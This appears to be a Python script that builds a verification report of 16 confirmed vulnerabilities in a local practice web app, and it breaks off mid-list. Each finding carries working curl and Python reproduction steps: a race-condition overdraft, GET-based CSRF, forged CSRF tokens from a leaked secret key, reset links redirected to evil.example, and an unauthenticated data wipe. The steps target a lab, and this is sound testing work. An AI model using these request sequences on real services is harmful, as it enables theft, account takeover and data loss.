# -*- coding: utf-8 -*-
"""t5 核验产物生成器：把逐条核验结果落成 verified-<ts>.json + .md
输入=核验实测结论（本文件内静态固化，每条均指向对应原始包 JSON）
"""
import json, os, time, hashlib

EVID = r"C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence"
TS = "20261012-184800"
BASE_SHA = "49b2032c29f8057530704203fd361bb162461eaeeeeb874c7ac1b8e8956cc7af"
H = "http://127.0.0.1:8095"

# 原始包文件 sha256（便于 scribe 引用时校验未被改动）
def sha(p):
    fp = os.path.join(EVID, p)
    if not os.path.exists(fp):
        return None
    h = hashlib.sha256()
    with open(fp, "rb") as fh:
        for c in iter(lambda: fh.read(65536), b""):
            h.update(c)
    return h.hexdigest()

RAW = {
    "baseline": "verify-00-baseline-20261012-1855.json",
    "race": "verify-01-race-20261012-1855.json",
    "logic": "verify-02-logic-session-20261012-1855.json",
    "inj": "verify-03-injection-ssrf-upload-20261012-1855.json",
    "ssrf": "verify-04-ssrf-redirect-upload-20261012-1855.json",
    "ssrf2": "verify-05-ssrf-chain-20261012-1855.json",
    "csrf": "verify-06-csrf-hmac-proof-20261012-1855.json",
    "sqlmap_q_and_login": "sqlmap-t5-verify.log",
    "sqlmap_board": "sqlmap-t5-verify-board2.log",
    "appsrc": r"..\..\..\target-site-lab\app.py",
}
APPSRC_ABS = os.path.join(EVID, "..", "..", "..", "target-site-lab", "app.py")
_h = hashlib.sha256()
with open(os.path.abspath(APPSRC_ABS), "rb") as _fh:
    _h.update(_fh.read())
APP_SHA = _h.hexdigest()
RAW_SHA = {k: sha(v) for k, v in RAW.items() if not v.startswith("..")}
RAW_SHA["appsrc"] = APP_SHA

findings = []
def F(**kw):
    findings.append(kw)

F(
    id="VER-01", src_id="HUNT-01", verdict="confirmed", severity="high",
    cvss_like="7.5 (AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H)",
    title="并发下单把余额扣成负数：/order/create 余额校验与扣款不在同一原子操作（TOCTOU）",
    class_eval="真的可利用（非扫描器噪音）",
    http_evidence=H + "/order/create?product_id=3&qty=1 ×30 并发（仅带 Cookie，无 CSRF）",
    raw_request="GET /order/create?product_id=3&qty=1 HTTP/1.1\nHost: 127.0.0.1:8095\nCookie: token=<demo 会话>",
    repro_cmd=[
        "curl.exe -s -c C:\\temp\\t5jar http://127.0.0.1:8095/__reset",
        "curl.exe -s -i -b C:\\temp\\t5jar -c C:\\temp\\t5jar -d \"username=demo&password=demo123\" http://127.0.0.1:8095/login",
        "# Windows 下 30 路并发（PowerShell 7）：",
        "1..30 | ForEach-Object -Parallel { curl.exe -s -o NUL -w \"%{http_code}\\n\" -b C:\\temp\\t5jar \"http://127.0.0.1:8095/order/create?product_id=3&qty=1\" } -ThrottleLimit 30",
        "python -c \"import sqlite3;print(sqlite3.connect(r'C:\\Users\\Administrator\\Documents\\deepseek-harness\\default-workspace\\target-site-lab\\lab.db').execute(\\\"select balance_cents from users where username='demo'\\\").fetchone())\"",
    ],
    repro_rate="3/3 轮复现（30 并发），余额 50000 → -7000 / -3200 / -7000；可控条件下建议标注 ≥95%",
    harm_proof={
        "before": {"demo.balance_cents": 50000, "orders": 3, "affordable_orders_at_1900": 26},
        "after": {"demo.balance_cents": -7000, "orders": 33, "successful_orders": 30,
                  "asset_deficit_cents": 57000, "overdraft_cents": 7000},
        "对比句": "全额支付能力仅 26 单，实际全部成功 28–30 单，账面资产由 50000 分变为 -3200 ~ -7000 分",
        "对照组（原子实现）": "/wallet/withdraw 同一载荷 20 并发 → 无负数（源码为带 balance_cents>=? 条件的单条 UPDATE）",
        "佐证": "响应体自报余额最小到 17700/19600/25300 分，与库内 -7000/-3200/-7000 相互印证；库直查 users.balance_cents",
    },
    source_logic="app.py:921-969 L949 先 SELECT 读余额校验，L955 再无条件 UPDATE；两语句间无事务/行锁/条件更新",
    rollback="/__reset（sha256 已回到基线 " + BASE_SHA + "）",
    files=["verify-01-race-20261012-1855.json"],
)

F(
    id="VER-02", src_id="HUNT-02", verdict="confirmed", severity="medium",
    cvss_like="6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:L)",
    title="业务接口完全不校验 CSRF 且不限 HTTP 方法：顶级 GET 导航即扣款/建单/改单/领券",
    class_eval="真的可利用（非噪音）；但『SameSite=Lax 不拦 CSRF』这一表述需修正",
    http_evidence=H + "/wallet/withdraw|/order/create|/order/status|/coupon/claim（GET 或 POST，不带 csrf_token）",
    raw_request="GET /wallet/withdraw?amount=700 HTTP/1.1\nHost: 127.0.0.1:8095\nCookie: token=<alice 会话>\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: navigate\nReferer: http://evil.example/csrf.html",
    repro_cmd=[
        "curl.exe -s -c C:\\temp\\t5jar2 -d \"username=alice&password=alice123\" http://127.0.0.1:8095/login",
        "curl.exe -s -i -b C:\\temp\\t5jar2 \"http://127.0.0.1:8095/wallet/withdraw?amount=700\"   # 200 提现成功",
        "curl.exe -s -i -b C:\\temp\\t5jar2 -d \"product_id=1&qty=1\" http://127.0.0.1:8095/order/create  # 200 下单成功",
        "curl.exe -s -i -b C:\\temp\\t5jar2 \"http://127.0.0.1:8095/order/status?order_id=2&state=paid\"  # 200 改单成功",
        "curl.exe -s -i -b C:\\temp\\t5jar2 \"http://127.0.0.1:8095/coupon/claim?code=WELCOME10\"        # 200 领券 +1000",
    ],
    repro_rate="4/4 端点稳定复现（余额/订单/状态/领券四类状态变更各 1 次，全部 200 且库内可见）",
    harm_proof={
        "before": {"alice.balance_cents": 88800, "order2.state": "unpaid", "coupon_claims": 0},
        "after": {"alice.balance_cents": 87100, "order2.state": "paid", "coupon_claims": 1,
                  "新增订单": "无线鼠标×1 = 29900 分"},
        "对比句": "仅带会话 Cookie 的 GET 请求使余额减少 1700 分、订单状态被推进、券被领取；全程无 csrf_token 参数",
        "跨站条件": "服务端不校验 Origin/Referer/Sec-Fetch-*；同会话下带 Sec-Fetch-Site: cross-site 的 GET 仍 200 → 顶级导航型 CSRF 成立",
        "同源对照": "/wallet/transfer、/change-password 无 token → 403（证明本站确实有 CSRF 机制，只是这 4 个入口漏接）",
    },
    source_logic="app.py:805 /order/status 表单用 method=get；wallet_withdraw(1057)/order_create(921)/order_status(974)/coupon_claim(1015) 均不调用 verify_csrf，也不判 self.command",
    rollback="/__reset",
    files=["verify-02-logic-session-20261012-1855.json"],
    correction="原报告『SameSite=Lax 不拦截顶级 GET 导航，CSRF 完全成立』前半句正确；但要说明 SameSite=Lax 本身会拦跨站 POST/子资源，攻击链必须走顶级 GET 导航（window.open/location/表单 GET），不带 Cookie 的跨站 POST 无效。",
)

F(
    id="VER-03", src_id="HUNT-03", verdict="confirmed", severity="high",
    cvss_like="7.2 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N) —— 前置=admin 会话或被窃会话 token",
    title="/debug 泄露 SECRET_KEY → CSRF token 可离线伪造 → 实测改密/转账成功",
    class_eval="真的可利用；前置条件明确（admin 角色或被窃 token）",
    http_evidence=H + "/debug（admin）→ HMAC-SHA256(SECRET_KEY, session_token) → /change-password、/wallet/transfer",
    raw_request="GET /debug HTTP/1.1\nHost: 127.0.0.1:8095\nCookie: token=<admin 会话>\n\n响应含 \"SECRET_KEY\": \"lab-secret-key-PLEASE-CHANGE-001\"",
    repro_cmd=[
        "curl.exe -s -c C:\\temp\\t5jar3 -d \"username=admin&password=Lab@Admin2024!Secure#9\" http://127.0.0.1:8095/login",
        "curl.exe -s -b C:\\temp\\t5jar3 http://127.0.0.1:8095/debug   # 取 SECRET_KEY",
        "python -c \"import hmac,hashlib;print(hmac.new(b'lab-secret-key-PLEASE-CHANGE-001',b'<session_token>',hashlib.sha256).hexdigest())\"",
        "curl.exe -s -i -b C:\\temp\\t5jar3 -d \"csrf_token=<上一步结果>&to=demo&amount=500\" http://127.0.0.1:8095/wallet/transfer  # 200 转账成功",
        "curl.exe -s -i -b C:\\temp\\t5jar3 -d \"csrf_token=<同上>&new_password=verifierT5pw!\" http://127.0.0.1:8095/change-password  # 200 改密成功",
    ],
    repro_rate="3/3：/home 与 /change-password 页面 token 与自算 HMAC 逐字符相等（6cee612d…806e）；伪造 token 转账 200、改密 200 且新口令可登录",
    harm_proof={
        "before": {"admin.balance_cents": 100000, "demo.balance_cents": 50000, "alice.password": "alice123"},
        "after": {"admin.balance_cents": 99500, "demo.balance_cents": 50500,
                  "alice.password": "verifierT5pw!（随后已回滚为 alice123）",
                  "alice_old_pw_login": 200, "alice_new_pw_login": 302},
        "对比句": "无 token 的转账请求 403；用离线计算出的 token 完成 500 分转账与一次真实改密并成功登录",
        "可回滚记录": "改密后用同通道改回 alice123 并复登成功，最后 /__reset 兜底",
        "token 绑定关系": "alice 的 token 用在 demo 会话上 → 403（token 绑定 session token，不与用户绑定）",
        "前置条件复核": "SESSION token 由 secrets.token_urlsafe(32) 生成，长度 43，本机无法预测；因此该链在『已持有 admin 会话或被窃 token』前提下成立，独立可利用性低于 VER-02",
    },
    source_logic="app.py:1251 /debug 直接回显 SECRET_KEY；app.py:361 csrf_token=HMAC(SECRET_KEY, session_token)，无随机 nonce、无过期",
    rollback="/__reset + 改回原口令（均已完成）",
    files=["verify-06-csrf-hmac-proof-20261012-1855.json", "verify-02-logic-session-20261012-1855.json"],
)

F(
    id="VER-04", src_id="HUNT-04", verdict="confirmed", severity="medium",
    cvss_like="5.4 (AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N)",
    title="GET /logout 只清浏览器 Cookie，不删除服务端 sessions 行：旧 token 仍可完整访问账户",
    class_eval="真的可利用（会话失效语义失效）；危害上限受限于『需先持有 Cookie』",
    http_evidence=H + "/logout → 旧 Cookie 重放 /home = 200 钱包页",
    raw_request="GET /logout HTTP/1.1\nHost: 127.0.0.1:8095\nCookie: token=<demo 会话>\n\n→ 302, Set-Cookie: token=; Path=/; Max-Age=0",
    repro_cmd=[
        "curl.exe -s -c C:\\temp\\t5jar4 -d \"username=demo&password=demo123\" http://127.0.0.1:8095/login",
        "curl.exe -s -i -b C:\\temp\\t5jar4 http://127.0.0.1:8095/logout",
        "curl.exe -s -o NUL -w \"%{http_code}\\n\" -b C:\\temp\\t5jar4 http://127.0.0.1:8095/home   # 200，仍显示『我的钱包』",
        "python -c \"import sqlite3;print(sqlite3.connect(r'C:\\...\\lab.db').execute('select count(*) from sessions').fetchone())\"",
    ],
    repro_rate="2/2 稳定复现（step2 与 step3 各一次）；登出后 sessions 表仍含该 token 行，/home 200",
    harm_proof={
        "before": {"sessions含demo token": True},
        "after": {"logout响应": "302 + 清除 Cookie", "sessions仍含demo token": True,
                  "旧Cookie访问/home": "200 且正文含『我的钱包』"},
        "对比句": "服务端会话未失效，用户以为已登出；共享设备/被窃 Cookie 场景下会话持续有效",
    },
    source_logic="app.py:567-568 logout 只发 clear_cookie，无 DELETE FROM sessions",
    rollback="无需（仅新增会话），最后 /__reset 清理",
    files=["verify-02-logic-session-20261012-1855.json", "verify-03-injection-ssrf-upload-20261012-1855.json"],
)

F(
    id="VER-05", src_id="HUNT-05", verdict="confirmed", severity="medium",
    cvss_like="5.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)",
    title="/forgot 回显攻击者可控 Host/X-Forwarded-Host，且重置 token=md5(username) 可离线预测",
    class_eval="真的可利用（Host 注入 + 弱 token 均实测）；但改密链未闭合（/reset 消费端 404）",
    http_evidence=H + "/forgot?username=demo，头 X-Forwarded-Host: evil.example / Host: attacker.tld",
    raw_request="GET /forgot?username=demo HTTP/1.1\nHost: 127.0.0.1:8095\nX-Forwarded-Host: evil.example",
    repro_cmd=[
        "curl.exe -s -H \"X-Forwarded-Host: evil.example\" \"http://127.0.0.1:8095/forgot?username=demo\"",
        "# 正文出现 http://evil.example/reset?user=demo&token=fe01ce2a7fbac8fafaed7c982a04e229",
        "python -c \"import hashlib;print(hashlib.md5(b'demo').hexdigest())\"   # 与上面 token 一致",
        "curl.exe -s -o NUL -w \"%{http_code}\\n\" \"http://127.0.0.1:8095/reset?user=demo&token=fe01ce2a7fbac8fafaed7c982a04e229\"  # 404",
    ],
    repro_rate="Host 注入 3/3（X-Forwarded-Host、Host 两种头都回显）；token 可预测 2/2；/reset 消费端 GET/POST 均 404（链条未闭合）",
    harm_proof={
        "before": {"无": "-"},
        "after": {"回显链接": "http://evil.example/reset?user=demo&token=fe01ce2a7fbac8fafaed7c982a04e229",
                  "token 与 md5(用户名) 一致": True},
        "对比句": "密码重置邮件/链接中的域名可被攻击者指定（钓鱼、链接劫持），token 无需访问数据库即可预算；但因 /reset 不存在，当前无法实际改密",
        "限定": "危害等级按『钓鱼/Host 劫持』计，不按『任意用户改密』计——后者证据不足",
    },
    source_logic="app.py:771-778 host 取 X-Forwarded-Host/Host 原样拼接；token = md5(username)；全文件无 /reset 路由（仅 /__reset）",
    rollback="无（只读）",
    files=["verify-03-injection-ssrf-upload-20261012-1855.json"],
)

F(
    id="VER-06", src_id="HUNT-06", verdict="confirmed", severity="medium",
    cvss_like="6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H) —— 受『仅回环可达』限制",
    title="GET /__reset 无认证无 CSRF，一键删库重建（数据完整性完全丧失）",
    class_eval="真的可利用，但前提是能访问 127.0.0.1:8095（本地进程/同机浏览器页面）",
    http_evidence=H + "/__reset（不带任何 Cookie/令牌）→ 200『已重置』",
    raw_request="GET /__reset HTTP/1.1\nHost: 127.0.0.1:8095",
    repro_cmd=[
        "curl.exe -s -i http://127.0.0.1:8095/__reset   # 200，正文『已重置』",
        "python -c \"import sqlite3;print(sqlite3.connect(r'C:\\...\\lab.db').execute('select count(*) from messages').fetchone())\"  # 回到 1",
    ],
    repro_rate="6/6（本任务每次复现流程都以它复位，均 200 且库哈希回到基线）",
    harm_proof={
        "before": {"messages": 1455, "sessions": 2, "orders": 3},
        "after": {"messages": 1, "sessions": 0, "orders": 3, "sha256": BASE_SHA},
        "对比句": "一次匿名 GET 清空业务数据与上传目录；uploads/ 被整体重建",
        "补充实测": "本次核验中 sqlmap 向 /board 写入 1454 行匿名留言后，一次 /__reset 即全部抹除",
    },
    source_logic="app.py:1270-1278 仅校验 client_address 为回环，无令牌",
    rollback="不可回滚（数据即被删除）",
    files=["verify-00-baseline-20261012-1855.json", "verify-03-injection-ssrf-upload-20261012-1855.json"],
)

F(
    id="VER-07", src_id="HUNT-07", verdict="confirmed", severity="medium",
    cvss_like="5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L)",
    title="POST /board 匿名可写、无频控、内容长度无上限",
    class_eval="真的可利用（噪声型）；输出侧转义到位，不构成存储型 XSS",
    http_evidence=H + "/board（无 Cookie）",
    raw_request="POST /board HTTP/1.1\nHost: 127.0.0.1:8095\nContent-Type: application/x-www-form-urlencoded\n\ncontent=T5-anon-verifier-probe",
    repro_cmd=[
        "curl.exe -s -i -d \"content=T5-anon-verifier-probe\" http://127.0.0.1:8095/board   # 302 → /board",
        "curl.exe -s http://127.0.0.1:8095/board | Select-String T5-anon-verifier-probe",
    ],
    repro_rate="稳定复现；本次核验副作用实测：sqlmap 布尔盲注测试 2 秒内向 /board 写入 555 行（该端点的写入无任何限速，是同一缺陷的放大证据）",
    harm_proof={
        "before": {"messages": 1},
        "after": {"messages": 2, "新行": "author=anonymous, content=T5-anon-verifier-probe"},
        "对比句": "匿名请求直接落库；同一通道可无限写入（实测 1454 行）",
        "转义复核": "GET /board 正文中 XSS 载荷以 &lt;img src=x onerror=alert(1)&gt; 形式出现，未构成 XSS",
    },
    source_logic="app.py:736-751 board() 的 POST 分支不要求登录，author 缺省 'anonymous'",
    rollback="/__reset",
    files=["verify-03-injection-ssrf-upload-20261012-1855.json"],
)

F(
    id="VER-08", src_id="HUNT-08", verdict="confirmed", severity="low",
    cvss_like="3.7 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)",
    title="POST /upload 文件名未做字符集/保留名校验：含 Windows 非法字符或 NUL 的文件名触发未处理异常 500（匿名可触发）",
    class_eval="真的可利用（可用性/异常面），但无文件落地 → 危害受限",
    http_evidence=H + "/upload（multipart，filename 可控）",
    raw_request="POST /upload HTTP/1.1\nHost: 127.0.0.1:8095\nContent-Type: multipart/form-data; boundary=----t5vb\n\n--…filename=\"a×296.txt\" / \"<b>tag</b>.txt\" / \"nul\\x00name.txt\"",
    repro_cmd=[
        "python -c \"import urllib.request as u;b='----x';body=(f'--{b}\\r\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"{chr(97)*296}.txt\\\"\\r\\nContent-Type: text/plain\\r\\n\\r\\nhi\\r\\n--{b}--\\r\\n').encode();r=u.urlopen(u.Request('http://127.0.0.1:8095/upload',body,{'Content-Type':'multipart/form-data; boundary='+b}));print(r.status)\"",
        "# 观察 C:\\...\\target-site-lab\\lab_errors.log 尾部堆栈",
    ],
    repro_rate="3/3 触发（296×'a'.txt → 500 OSError Errno 22；'<b>tag</b>.txt' → 500 OSError；nul\\x00name.txt → 500 ValueError embedded null character）",
    harm_proof={
        "before": {"lab_errors.log": 24001, "uploads/": []},
        "after": {"lab_errors.log": 25759, "uploads/": [], "堆栈": "app.py:852 open(dest,'wb') OSError [Errno 22] …\\uploads\\b>.txt / ValueError: embedded null character"},
        "对比句": "文件名清洗只取 basename + 校验后缀，未过滤 '>' NUL 等字符；open 失败即 500 并写完整绝对路径堆栈",
    },
    source_logic="app.py:841-853 仅 os.path.basename + 后缀/MIME 校验；无字符集校验、无 try/except",
    rollback="无（未落盘）；last /__reset",
    files=["verify-03-injection-ssrf-upload-20261012-1855.json", "verify-04-ssrf-redirect-upload-20261012-1855.json"],
    extra="补充实测：匿名成功上传 4 个文件（verifier_ok.txt、semi;name.txt、shell.txt 等），即 /upload 无需登录，构成匿名存储占用面（原清单未列，报告建议单列。）",
)

F(
    id="VER-09", src_id="HUNT-09", verdict="confirmed", severity="low",
    cvss_like="3.1 (AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N)",
    title="form() 中 query 覆盖 body：GET/POST 同权、参数来源不受方法限制",
    class_eval="真的可利用（是 VER-02 的成因之一），单独危害低",
    http_evidence="POST /wallet/withdraw?amount=1 + body amount=999999 → 实际按 1 执行",
    raw_request="POST /wallet/withdraw?amount=1 HTTP/1.1\nHost: 127.0.0.1:8095\nCookie: token=<demo>\nContent-Type: application/x-www-form-urlencoded\n\namount=999999",
    repro_cmd=["curl.exe -s -i -b C:\\temp\\t5jar5 -d \"amount=999999\" \"http://127.0.0.1:8095/wallet/withdraw?amount=1\""],
    repro_rate="1/1 本轮 + 与 hunter F2 一致（按 1 分扣款，非 999999）",
    harm_proof={
        "before": {"demo.balance_cents": 50500},
        "after": {"demo.balance_cents": 50499},
        "对比句": "body 里的 999999 被 query 的 1 覆盖；任何只校验 body 的防护对该通道失效",
    },
    source_logic="app.py:336-347 form()：data.update(q) 在读取 body 之后执行，query 优先级更高",
    rollback="/__reset",
    files=["verify-02-logic-session-20261012-1855.json"],
)

F(
    id="VER-10", src_id="HUNT-10", verdict="confirmed", severity="low",
    cvss_like="4.0 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L)",
    title="登录态访问 GET / 稳定 500；未登录 200（sqlite3.Row 无 .get()）",
    class_eval="真的可利用（功能缺陷/可用性），本身不泄露机密",
    http_evidence="GET / 带有效 Cookie → 500；不带 Cookie → 200",
    raw_request="GET / HTTP/1.1\nHost: 127.0.0.1:8095\nCookie: token=<任意有效会话>",
    repro_cmd=[
        "curl.exe -s -c C:\\temp\\t5jar6 -d \"username=alice&password=alice123\" http://127.0.0.1:8095/login",
        "curl.exe -s -o NUL -w \"%{http_code}\\n\" -b C:\\temp\\t5jar6 http://127.0.0.1:8095/    # 500",
        "curl.exe -s -o NUL -w \"%{http_code}\\n\" http://127.0.0.1:8095/                      # 200",
    ],
    repro_rate="12/12 登录态 500（alice/demo/admin 各 4 次），4/4 匿名 200",
    harm_proof={
        "before": {"anon GET / ": 200},
        "after": {"alice/demo/admin GET / ": [500, 500, 500, 500]},
        "对比句": "任何已登录角色访问首页 100% 崩溃，错误页替换正常内容",
    },
    source_logic="app.py:511-513 (self.current_user(conn) or {}).get('username')：current_user 返回 sqlite3.Row，Row 无 .get → AttributeError；匿名时为 {} 故正常",
    rollback="无",
    files=["verify-03-injection-ssrf-upload-20261012-1855.json"],
)

F(
    id="VER-11", src_id="HUNT-11", verdict="confirmed", severity="low",
    cvss_like="2.7 (AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L)",
    title="提现金额缺乏上限校验：>2^63-1 触发 SQLite 绑定 OverflowError → 500",
    class_eval="真的可利用（异常面），无资金影响",
    http_evidence="GET /wallet/withdraw?amount=9223372036854775808 → 500",
    raw_request="GET /wallet/withdraw?amount=9223372036854775808 HTTP/1.1\nHost: 127.0.0.1:8095\nCookie: token=<demo>",
    repro_cmd=[
        "curl.exe -s -o NUL -w \"%{http_code}\\n\" -b C:\\temp\\t5jar7 \"http://127.0.0.1:8095/wallet/withdraw?amount=9223372036854775808\"  # 500",
        "curl.exe -s -o NUL -w \"%{http_code}\\n\" -b C:\\temp\\t5jar7 \"http://127.0.0.1:8095/wallet/withdraw?amount=9223372036854775807\"  # 200 余额不足",
    ],
    repro_rate="1/1 本轮（与 hunter F3 一致）；余额前后无变化（50486 → 50486）",
    harm_proof={"before": {"demo.balance_cents": 50486}, "after": {"demo.balance_cents": 50486},
                "对比句": "仅异常页，无资金影响"},
    source_logic="app.py:1075-1078 UPDATE 绑定 int 超过 SQLite INTEGER 上限 → OverflowError 未捕获",
    rollback="无",
    files=["verify-02-logic-session-20261012-1855.json"],
    correction="修正原报告一处：amount=1e23 实测为 400（int('1e23') 抛 ValueError → amount=0 → 金额无效），**不是** 500。原 F3『1e23 → 500』记为不准确。",
)

F(
    id="VER-12", src_id="HUNT-12", verdict="confirmed", severity="low",
    cvss_like="3.7 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)",
    title="/api/search 响应体回显 SQL 模板字符串；LIKE 通配符未转义（q=% 或 _ 返回全表）",
    class_eval="真的可利用（信息泄露），注入本身被参数化挡住",
    http_evidence="GET /api/search?q=k → 响应含 \"sql\": \"SELECT id,name,price_cents FROM products WHERE name LIKE ?\"",
    raw_request="GET /api/search?q=%25 HTTP/1.1\nHost: 127.0.0.1:8095",
    repro_cmd=[
        "curl.exe -s \"http://127.0.0.1:8095/api/search?q=k\"      # 响应含 sql 字段",
        "curl.exe -s \"http://127.0.0.1:8095/api/search?q=%25\"    # 167 字节，全量 3 行",
        "curl.exe -s \"http://127.0.0.1:8095/api/search?q=_\"      # 同为通配全表",
    ],
    repro_rate="3/3 稳定；q=k 返回 1 行 84 字节，q=% / q=_ 返回 3 行 167 字节",
    harm_proof={"before": {"q=k 结果": 1}, "after": {"q=% 结果": 3, "q=_ 结果": 3},
                "对比句": "单字符即可枚举全表；同时暴露内部 SQL 与表结构（sqlite3 占位符风格）"},
    source_logic="app.py:619-625 api_search 直接把 sql 字符串放进 JSON；LIKE 参数为 f\"%{q}%\" 未转义 %/ _",
    rollback="无（只读）",
    files=["verify-02-logic-session-20261012-1855.json"],
)

F(
    id="VER-13", src_id="HUNT-13", verdict="confirmed", severity="low",
    cvss_like="4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L)",
    title="GET /logout 无 CSRF：任意页面可强制受害者登出（会话拒绝服务）",
    class_eval="真的可利用；与 VER-04 叠加后为『假登出』",
    http_evidence="GET /logout → 302 + Set-Cookie: token=; Max-Age=0",
    raw_request="GET /logout HTTP/1.1\nHost: 127.0.0.1:8095\nCookie: token=<demo>",
    repro_cmd=["curl.exe -s -i -b C:\\temp\\t5jar8 http://127.0.0.1:8095/logout"],
    repro_rate="2/2（step2/step3 各一次，均 302 且清 Cookie）",
    harm_proof={"before": {"登录态": True}, "after": {"HTTP": 302, "Cookie": "被清空", "服务端会话": "仍存在（VER-04）"},
                "对比句": "一句话即可让受害者掉线，且服务端会话不受影响"},
    source_logic="app.py:567 logout 无令牌校验",
    rollback="无",
    files=["verify-02-logic-session-20261012-1855.json"],
)

F(
    id="VER-14", src_id="HUNT-14", verdict="confirmed-no-impact", severity="info",
    cvss_like="0.0",
    title="/api/order?id= 类型宽松：'+1'/'01'/'1e0'/'1.0' 均等价 id=1",
    class_eval="行为确认，但不构成漏洞（属主校验仍在，无可利用前提）",
    http_evidence="GET /api/order?id=+1 → SQLite 隐式转换命中 id=1",
    raw_request="GET /api/order?id=+1 HTTP/1.1\nHost: 127.0.0.1:8095\nCookie: token=<alice>",
    repro_cmd=["curl.exe -s -b C:\\temp\\t5jar9 \"http://127.0.0.1:8095/api/order?id=+1\""],
    repro_rate="1/1 本轮（与 hunter B3 一致）",
    harm_proof={"before": {"订单2 属主": "alice"}, "after": {"id=+1 命中": "仅当订单属主为本人"},
                "对比句": "属主不符统一 404，未产生越权"},
    source_logic="app.py:656-660 查询后比对 row['user_id'] != user['id']",
    rollback="无",
    files=["verify-02-logic-session-20261012-1855.json"],
)

F(
    id="VER-15", src_id="HUNT-15", verdict="confirmed-no-impact", severity="info",
    cvss_like="0.0",
    title="/debug 对已登录非 admin 返回 403 而非 404：端点存在性可探测",
    class_eval="行为确认，无危害（纯信息项）",
    http_evidence="demo/alice 访问 /debug → 403；匿名 → 302",
    raw_request="GET /debug HTTP/1.1\nHost: 127.0.0.1:8095\nCookie: token=<demo>",
    repro_cmd=[
        "curl.exe -s -o NUL -w \"%{http_code}\\n\" -b C:\\temp\\t5jar10 http://127.0.0.1:8095/debug   # 403",
        "curl.exe -s -o NUL -w \"%{http_code}\\n\" -b C:\\temp\\t5jar10 http://127.0.0.1:8095/admin/users  # 404",
    ],
    repro_rate="1/1 本轮；demo/alice 均 403，/admin/* 均 404",
    harm_proof={"before": {"-": "-"}, "after": {"403 与 404 语义差异": True},
                "对比句": "仅暴露端点存在性，无法读取 SECRET_KEY（需 admin）"},
    source_logic="app.py:1243-1247 角色不符返回 403；admin_users 用 404 隐藏",
    rollback="无",
    files=["verify-02-logic-session-20261012-1855.json"],
)

F(
    id="VER-16", src_id="HUNT-不适用（新发现）", verdict="confirmed", severity="low",
    cvss_like="3.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)",
    title="新增：POST /upload 匿名可用（无认证），可无限写入 uploads/",
    class_eval="真的可利用（存储占用面）；原 t4 清单只在阴性项提到上传，未列为发现",
    http_evidence="无 Cookie 的 multipart POST /upload → 200 且文件落盘",
    raw_request="POST /upload HTTP/1.1\nHost: 127.0.0.1:8095\nContent-Type: multipart/form-data; boundary=----t5vb\n\n…filename=\"verifier_ok.txt\"",
    repro_cmd=[
        "curl.exe -s -F \"file=@%TEMP%\\a.txt;filename=anon_upload.txt\" http://127.0.0.1:8095/upload   # 200 已上传",
        "curl.exe -s -o NUL -w \"%{http_code}\\n\" http://127.0.0.1:8095/uploads/anon_upload.txt          # 200",
    ],
    repro_rate="2/2（verifier_ok.txt、semi;name.txt 均匿名落盘）；uploads/ 目视确认",
    harm_proof={
        "before": {"uploads/": []},
        "after": {"uploads/": ["semi;name.txt", "shell.txt", "verifier_ok.txt"]},
        "对比句": "匿名请求即可落盘，单文件上限 5MB、无总量/频控 → 磁盘可被逐个 5MB 写满",
    },
    source_logic="app.py:813-854 upload() 不调用 require_user",
    rollback="/__reset（删除整个 uploads/ 目录）",
    files=["verify-04-ssrf-redirect-upload-20261012-1855.json"],
)

false_positives = [
    {"id": "FP-01", "ref": "HUNT-11 附述『amount=1e23 → 500』", "verdict": "false-positive",
     "reason": "int('1e23') 抛 ValueError → amount=0 → 走『金额无效』分支返回 400，实测 400/400；非异常面",
     "evidence": "verify-02-logic-session-20261012-1855.json hunt11.1e23 = [400, 50486, 50486]"},
    {"id": "FP-02", "ref": "无（本轮自作假设）『/redirect 开放重定向』", "verdict": "false-positive",
     "reason": "该路径不存在：GET /redirect 与 /redirect?to=… 均 404，源码无对应路由；step3 初测记录里的 302 系对照实验误读",
     "evidence": "verify-04-ssrf-redirect-upload-20261012-1855.json redirect_endpoint"},
    {"id": "FP-03", "ref": "推测『/fetch 跟随重定向可读 admin /debug』", "verdict": "false-positive",
     "reason": "出站请求由服务端 urllib 生成且不转发 Cookie → 永远以匿名身份拉取；/debug 匿名必 302 到 /?err=login。且 /fetch 只跟随绝对 Location，本站无任何端点生成绝对 Location（/forgot<path> 的跳板实测直接返回 200 正文，未走重定向）",
     "evidence": "verify-05-ssrf-chain-20261012-1855.json（direct_debug 为登录页 2156B；chain_to_debug 未含 SECRET_KEY）"},
    {"id": "FP-04", "ref": "旧结论 admin/admin123 弱口令、8095 明文口令" , "verdict": "false-positive（已失效）",
     "reason": "18:11 起 /__reset 重建库后 admin 为 22 位强口令；明文入库属源码标注的教学面，非本期可报告漏洞",
     "evidence": "verify-00-baseline-20261012-1855.json post_reset.users"},
    {"id": "FP-05", "ref": "『/uploads/<name> 结果页反射 XSS』（我的初始假设）", "verdict": "false-positive",
     "reason": "file= 值经 urllib.parse.quote 后再插入 href，显示文本 html.escape；实测含 <>、引号的文件名要么被 400 拒绝（引号破坏 regex 出栈），要么 open() 500，未观察到原始标签反射",
     "evidence": "verify-04-ssrf-redirect-upload-20261012-1855.json upload_detail"},
]

negatives = [
    {"id": "N-01", "area": "SQL 注入", "verdict": "独立复核=确认为阴性",
     "how": "自行以 sqlmap（level2/risk1，BEUSTQ）打 3 个入口：8095 /api/search?q（带会话）、8095 /login(username)、8095 /board(content,B)",
